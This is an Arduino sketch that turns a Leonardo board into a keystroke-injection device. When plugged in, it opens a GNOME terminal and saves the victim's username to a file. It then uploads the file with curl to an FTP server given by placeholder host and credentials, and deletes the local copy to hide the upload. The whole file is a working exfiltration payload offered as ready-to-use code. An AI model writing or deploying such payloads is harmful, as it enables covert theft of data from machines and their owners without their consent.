#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarGnome("gnome-terminal");
  delay(3000);
  Keyboard.println("export xfile='LinuxUser.txt'; export ftpuser='USERNAME'; export ftppass='PASSWORD'; data=\"$(whoami)\"; echo ${data}>${xfile}; export xip='IPSERVERFTP'");
  delay(3000);
  Keyboard.println("curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}");
  delay(7000);
  Keyboard.println("rm LinuxUser.txt");
  delay(2000);
  Keyboard.println("exit");
  while(1);
}
